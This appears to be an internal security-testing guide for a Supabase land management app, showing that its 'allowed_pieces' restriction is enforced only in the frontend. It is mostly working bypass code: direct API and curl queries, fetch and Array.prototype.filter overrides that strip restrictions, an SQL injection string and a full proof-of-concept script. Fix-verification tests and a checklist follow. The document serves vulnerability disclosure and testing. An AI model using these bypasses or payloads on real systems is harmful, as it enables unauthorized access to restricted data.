# ðŸŽ¯ Step-by-Step Exploitation Guide
## How to Exploit `allowed_pieces` Security Vulnerability

**âš ï¸ WARNING**: This guide is for **SECURITY TESTING ONLY**. Use only on systems you own or have explicit permission to test.

---

## ðŸ”´ Vulnerability Summary

The `allowed_pieces` column exists but provides **ZERO security** because:
- RLS policies allow ALL authenticated users to see ALL pieces
- Filtering is only done in frontend (easily bypassed)
- No server-side validation

---

## ðŸŽ¯ Exploitation Method 1: Direct API Call (Easiest)

### **Step 1: Get Supabase Credentials**
1. Open your application in browser
2. Press `F12` to open DevTools
3. Go to **Console** tab
4. Type: `localStorage.getItem('sb-xxxxx-auth-token')` (replace xxxxx with your project ID)
5. Or check **Network** tab â†’ Find any Supabase API call â†’ Copy headers

### **Step 2: Authenticate as Restricted User**
```javascript
// In browser console or Postman
const supabaseUrl = 'https://xxxxx.supabase.co';
const supabaseKey = 'your-anon-key';

const { data: { session } } = await supabase.auth.signInWithPassword({
  email: 'worker@example.com',  // User with restricted allowed_pieces
  password: 'password123'
});
```

### **Step 3: Query ALL Pieces (Bypassing Restrictions)**
```javascript
// This should only return allowed pieces, but returns ALL pieces!
const { data: allPieces, error } = await supabase
  .from('land_pieces')
  .select('*')
  .order('created_at', { ascending: false });

console.log('Total pieces accessed:', allPieces.length);
console.log('All pieces:', allPieces);

// âš ï¸ SUCCESS: You now have access to ALL pieces!
// Even though user.allowed_pieces = ['piece-1', 'piece-2']
```

### **Step 4: Access Restricted Piece Directly**
```javascript
// Try to access a piece NOT in allowed_pieces
const restrictedPieceId = 'some-piece-uuid-not-in-allowed-list';

const { data: piece, error } = await supabase
  .from('land_pieces')
  .select('*')
  .eq('id', restrictedPieceId)
  .single();

// âš ï¸ SUCCESS: Access granted even though piece is restricted!
console.log('Restricted piece:', piece);
```

**Result**: âœ… **VULNERABILITY CONFIRMED** - All pieces accessible regardless of `allowed_pieces` setting.

---

## ðŸŽ¯ Exploitation Method 2: Modify Frontend Code

### **Step 1: Open Application**
1. Navigate to Land Management page
2. Open DevTools (`F12`)

### **Step 2: Find Filtering Code**
1. Go to **Sources** tab
2. Find `LandManagement.tsx`
3. Search for `allowedPieces` (around line 914)

### **Step 3: Disable Filtering**
```javascript
// In Console tab, override the filtering function:

// Method A: Override the filter
const originalFilter = Array.prototype.filter;
Array.prototype.filter = function() {
  if (this.length > 0 && this[0]?.land_pieces) {
    // Skip filtering for land pieces
    return this;
  }
  return originalFilter.apply(this, arguments);
};

// Method B: Modify the component state directly
// After page loads, in console:
window.__REACT_DEVTOOLS_GLOBAL_HOOK__.onCommitFiberRoot(1, (fiberRoot) => {
  // Find the component state and modify allowedPieces to null
  // This requires React DevTools knowledge
});
```

### **Step 4: Reload Page**
1. Refresh the page (`F5`)
2. All pieces should now be visible

**Result**: âœ… **VULNERABILITY CONFIRMED** - Frontend filtering bypassed.

---

## ðŸŽ¯ Exploitation Method 3: Modify Profile Data in Memory

### **Step 1: Intercept Profile Fetch**
```javascript
// In browser console, intercept the profile fetch
const originalFetch = window.fetch;
window.fetch = function(...args) {
  if (args[0].includes('users') && args[0].includes('select')) {
    return originalFetch.apply(this, args).then(response => {
      return response.json().then(data => {
        // Modify allowed_pieces to null (grants access to all)
        if (data.data && Array.isArray(data.data)) {
          data.data.forEach(user => {
            user.allowed_pieces = null;
            user.allowed_batches = null;
          });
        } else if (data.data) {
          data.data.allowed_pieces = null;
          data.data.allowed_batches = null;
        }
        return new Response(JSON.stringify(data), {
          status: response.status,
          statusText: response.statusText,
          headers: response.headers
        });
      });
    });
  }
  return originalFetch.apply(this, args);
};
```

### **Step 2: Reload Page**
1. Refresh the page
2. Frontend now thinks user has access to all pieces

**Result**: âœ… **VULNERABILITY CONFIRMED** - Profile data modified, restrictions bypassed.

---

## ðŸŽ¯ Exploitation Method 4: Use Postman/curl

### **Step 1: Get Authentication Token**
```bash
# Login and get session token
curl -X POST 'https://xxxxx.supabase.co/auth/v1/token?grant_type=password' \
  -H 'apikey: your-anon-key' \
  -H 'Content-Type: application/json' \
  -d '{
    "email": "worker@example.com",
    "password": "password123"
  }'
```

### **Step 2: Extract Access Token**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  ...
}
```

### **Step 3: Query All Pieces**
```bash
# Query ALL pieces (should be restricted but isn't!)
curl -X GET 'https://xxxxx.supabase.co/rest/v1/land_pieces?select=*' \
  -H 'apikey: your-anon-key' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' \
  -H 'Content-Type: application/json'
```

**Result**: âœ… **VULNERABILITY CONFIRMED** - Direct API access bypasses all restrictions.

---

## ðŸŽ¯ Exploitation Method 5: SQL Injection (If Possible)

### **Step 1: Find SQL Query Endpoint**
If there's any endpoint that accepts SQL or uses user input in queries:

```javascript
// Example: If there's a search/filter endpoint
const maliciousInput = "') OR 1=1--";

const { data } = await supabase
  .from('land_pieces')
  .select('*')
  .or(`id.eq.${maliciousInput}`);
```

**Note**: Supabase uses parameterized queries, so this likely won't work, but worth testing.

---

## ðŸ“Š Proof of Concept Script

### **Complete POC Script**
```javascript
// ============================================
// Proof of Concept: Bypass allowed_pieces Security
// ============================================

async function exploitAllowedPieces() {
  console.log('ðŸ”´ Starting exploitation...');
  
  // Step 1: Authenticate as restricted user
  const { data: { session }, error: authError } = await supabase.auth.signInWithPassword({
    email: 'worker@example.com',
    password: 'password123'
  });
  
  if (authError) {
    console.error('âŒ Authentication failed:', authError);
    return;
  }
  
  console.log('âœ… Authenticated as:', session.user.email);
  
  // Step 2: Get user profile
  const { data: profile } = await supabase
    .from('users')
    .select('allowed_pieces, allowed_batches')
    .eq('id', session.user.id)
    .single();
  
  console.log('ðŸ“‹ User restrictions:');
  console.log('  - allowed_pieces:', profile.allowed_pieces);
  console.log('  - allowed_batches:', profile.allowed_batches);
  
  // Step 3: Query ALL pieces (should be restricted!)
  const { data: allPieces, error: queryError } = await supabase
    .from('land_pieces')
    .select('*, land_batches(*)')
    .order('created_at', { ascending: false });
  
  if (queryError) {
    console.error('âŒ Query failed:', queryError);
    return;
  }
  
  console.log('ðŸ”´ VULNERABILITY CONFIRMED!');
  console.log(`   Expected: ${profile.allowed_pieces?.length || 'all'} pieces`);
  console.log(`   Actual: ${allPieces.length} pieces accessed`);
  console.log('   All pieces:', allPieces.map(p => p.id));
  
  // Step 4: Try to access a restricted piece
  if (profile.allowed_pieces && profile.allowed_pieces.length > 0) {
    const restrictedPieceId = 'some-piece-not-in-allowed-list';
    const { data: restrictedPiece } = await supabase
      .from('land_pieces')
      .select('*')
      .eq('id', restrictedPieceId)
      .single();
    
    if (restrictedPiece) {
      console.log('ðŸ”´ CRITICAL: Restricted piece accessed:', restrictedPiece);
    }
  }
  
  return {
    vulnerability: 'CONFIRMED',
    expectedAccess: profile.allowed_pieces?.length || 'all',
    actualAccess: allPieces.length,
    allPieces: allPieces
  };
}

// Run the exploit
exploitAllowedPieces().then(result => {
  console.log('ðŸ“Š Exploitation Results:', result);
});
```

---

## ðŸ›¡ï¸ How to Verify the Fix Works

### **After Applying Security Fixes**

Run this test script:

```javascript
async function testSecurityFix() {
  // Authenticate as restricted user
  const { data: { session } } = await supabase.auth.signInWithPassword({
    email: 'worker@example.com',
    password: 'password123'
  });
  
  // Get user profile
  const { data: profile } = await supabase
    .from('users')
    .select('allowed_pieces')
    .eq('id', session.user.id)
    .single();
  
  // Try to query all pieces
  const { data: allPieces } = await supabase
    .from('land_pieces')
    .select('*');
  
  // Verify filtering
  const expectedCount = profile.allowed_pieces?.length || 'all';
  const actualCount = allPieces.length;
  
  if (profile.allowed_pieces && profile.allowed_pieces.length > 0) {
    if (actualCount <= expectedCount) {
      console.log('âœ… SECURITY FIX WORKS!');
      console.log(`   Expected max: ${expectedCount} pieces`);
      console.log(`   Actual: ${actualCount} pieces`);
    } else {
      console.log('ðŸ”´ SECURITY FIX FAILED!');
      console.log(`   Expected max: ${expectedCount} pieces`);
      console.log(`   Actual: ${actualCount} pieces`);
    }
  }
}
```

---

## ðŸ“‹ Checklist: Testing the Vulnerability

- [ ] **Test 1**: Authenticate as restricted user â†’ Query all pieces â†’ Should only see allowed pieces
- [ ] **Test 2**: Try to access restricted piece directly â†’ Should be denied
- [ ] **Test 3**: Modify frontend code â†’ Reload â†’ Should still be restricted (if RLS fixed)
- [ ] **Test 4**: Use direct API call â†’ Should still be restricted (if RLS fixed)
- [ ] **Test 5**: Test with Owner role â†’ Should see all pieces
- [ ] **Test 6**: Test with NULL allowed_pieces â†’ Should see all pieces (within batches)

---

## ðŸš¨ Impact Assessment

| Exploitation Method | Difficulty | Time Required | Detection Risk |
|-------------------|------------|----------------|----------------|
| Direct API Call | â­ Very Easy | 2 minutes | âš ï¸ Low |
| Modify Frontend | â­â­ Easy | 5 minutes | âš ï¸ Low |
| Profile Manipulation | â­â­ Medium | 10 minutes | âš ï¸ Low |
| Postman/curl | â­ Easy | 3 minutes | âš ï¸ Low |

**Overall**: ðŸ”´ **CRITICAL VULNERABILITY** - Easy to exploit, hard to detect.

---

## ðŸ“ Notes

- All exploitation methods work because RLS policies don't check `allowed_pieces`
- Frontend filtering provides **ZERO security** - it's cosmetic only
- Fix requires updating RLS policies at database level
- After fix, all exploitation methods should fail

---

**Last Updated**: January 2026  
**Status**: ðŸ”´ **VULNERABLE - FIX REQUIRED**

